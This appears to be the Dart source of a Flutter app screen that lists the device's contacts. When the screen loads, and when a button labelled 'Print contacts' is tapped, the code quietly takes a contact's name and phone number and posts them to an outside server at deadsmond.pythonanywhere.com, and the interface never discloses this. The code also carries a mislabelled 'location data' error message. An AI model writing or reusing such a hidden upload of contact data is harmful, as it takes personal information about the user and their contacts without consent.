import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:async';
// import '../storages/ContentStorage.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;


//==============================================================================
//--------------------------- INITIALIZATION -----------------------------------
// FlatApp class object, operating algorithms and behaviour
class ContactsRoute extends StatefulWidget {
  //---------------------------- VARIABLES -------------------------------------
  @override
  _FlatAppMainState createState() => _FlatAppMainState();
}

//==============================================================================
//---------------------------- WIDGET ------------------------------------------
class _FlatAppMainState extends State<ContactsRoute> {
  //---------------------------- VARIABLES -------------------------------------
  // var to store contacts
  Iterable<Contact> _contacts;

  String _name;
  String _number;

  //---------------------------- INIT ------------------------------------------
  @override
  void initState() {
    super.initState();
    getContacts();
  }

  //---------------------------- CONTACTS --------------------------------------
  void getContacts() async {
    try {
      PermissionStatus permissionStatus = await _getPermission();
      if (permissionStatus == PermissionStatus.granted) {
        print("Loading contacts...");
        var contacts = await ContactsService.getContacts(withThumbnails: false);
        setState(() {
          _contacts = contacts;
          print('Contacts loaded successfully');
          print('Iterating through contacts...');
          iterateThroughContacts();
          print('Iteration completed.');
        });
      } else {
        throw PlatformException(
          code: 'PERMISSION_DENIED',
          message: 'Access to location data denied',
          details: null,
        );
      }
    } catch (e){
      // what went wrong?
      print(e);
    }
  }

  //---------------------------- PERMISSIONS -----------------------------------
  Future<PermissionStatus> _getPermission() async {
    PermissionStatus permission = await PermissionHandler()
        .checkPermissionStatus(PermissionGroup.contacts);
    if (permission != PermissionStatus.granted &&
        permission != PermissionStatus.disabled) {
      Map<PermissionGroup, PermissionStatus> permisionStatus =
      await PermissionHandler()
          .requestPermissions([PermissionGroup.contacts]);
      return permisionStatus[PermissionGroup.contacts] ??
          PermissionStatus.unknown;
    } else {
      return permission;
    }
  }

  //-------------------------- FILE CONTENT ------------------------------------

  void sendRequest() async {
    var url = 'https://deadsmond.pythonanywhere.com/checkpoint';
    Map<String, String> headers = {"Content-type": "application/json"};
    String jsonBody = '{"name": "$_name", "number": "$_number"}';
    http.Response response = await http.post(url, headers: headers, body: jsonBody);
    print('Response status: ${response.statusCode}');
    print('Response body: ${response.body}');
  }

  void processingFunc(var element){
    //processing or transformation on the element

    String name = element.displayName;
    String temp = element.toMap()['phones'].toList()[0]['value'];

    _name = name;
    _number = temp;

    print('$name $temp');
  }

  void iterateThroughContacts(){
    _contacts.forEach((i) =>
        processingFunc(i)
    );
    sendRequest();
  }
  
  void _operateContacts() async {
    // store contacts
    // storageContent.writeContent("CONTACTS_COPY", _contacts)
  }

  //---------------------------- MAIN WIDGET -----------------------------------
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('FlatApp: contacts list'),
        actions: <Widget>[
          new IconButton(
            icon: new Icon(Icons.close),
            onPressed: () =>
                SystemChannels.platform.invokeMethod('SystemNavigator.pop'),
          ),
        ],
      ),
      body: _contacts != null
          ? ListView.builder(
        itemCount: _contacts?.length ?? 0,
        itemBuilder: (context, index) {
          Contact c = _contacts?.elementAt(index);
          return ListTile(
            leading: (c.avatar != null && c.avatar.length > 0)
                ? CircleAvatar(
              backgroundImage: MemoryImage(c.avatar),
            )
                : CircleAvatar(child: Text(c.initials())),
            title: Text(c.displayName ?? ''),
          );
        },
      )
          : CircularProgressIndicator(),

      bottomNavigationBar: BottomNavigationBar(
          items: const <BottomNavigationBarItem>[
            BottomNavigationBarItem(
              icon: Icon(Icons.not_interested),
              title: Text('Exit'),
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.exit_to_app),
              title: Text('Load contacts'),
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.print),
              title: Text('Print contacts'),
            ),
          ],
          // operate NavigationBar
          onTap: (index) {
            // operate NavigationBar
            switch (index) {
              case 0:
                // EXIT --------------------------------------------------------
                // exit app - this is preferred way
                print("Closing app");
                SystemChannels.platform.invokeMethod('SystemNavigator.pop');
                break;
              case 1:
                // LOAD DATA ---------------------------------------------------
                try {
                  getContacts();
                } catch (e){
                  // what went wrong?
                  print(e);
                }
                break;
              case 2:
                iterateThroughContacts();
                break;
            // -----------------------------------------------------------------
            }
          }
      ),
    );
  }
}
//==============================================================================
